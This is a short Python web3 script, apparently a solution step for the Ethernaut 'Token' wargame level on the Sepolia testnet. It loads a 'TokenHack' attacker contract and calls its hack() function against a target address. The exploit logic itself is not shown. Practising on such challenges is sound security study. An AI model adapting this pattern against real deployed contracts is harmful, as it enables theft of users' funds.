from web3 import Web3
from web3.middleware import construct_sign_and_send_raw_middleware
from eth_account import Account
import json
import os
import time


API_OUT_PATH = '/Users/eric/ethernaut/out/'
CONTRACT_NAME = 'TokenHack'
CONTRACT_ADDRESS = '0x5F6A1e20E64dce54fD89a73001210f7d0f3e55EB'
HTTP_PROVIDER = os.getenv('SEPOLIA_RPC_URL')

w3 = Web3(Web3.HTTPProvider(HTTP_PROVIDER))
acct = w3.eth.account.from_key(os.getenv('PRIVATE_KEY'))
w3.eth.default_account = acct.address
w3.middleware_onion.add(construct_sign_and_send_raw_middleware(acct))

with open(API_OUT_PATH + CONTRACT_NAME + '.sol/' + CONTRACT_NAME + '.json', 'rb') as f:
    info_json = json.load(f)
abi = info_json['abi']

def get_contract():
    contract = w3.eth.contract(address=CONTRACT_ADDRESS, abi=abi)
    return contract

def main():
    contract = get_contract()

    tx = contract.functions.hack('0x104806172a3ccacaA7Be240aE3Ad7629a9f64Fd2').transact()
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print(receipt.status)

if __name__ == '__main__':
    main()
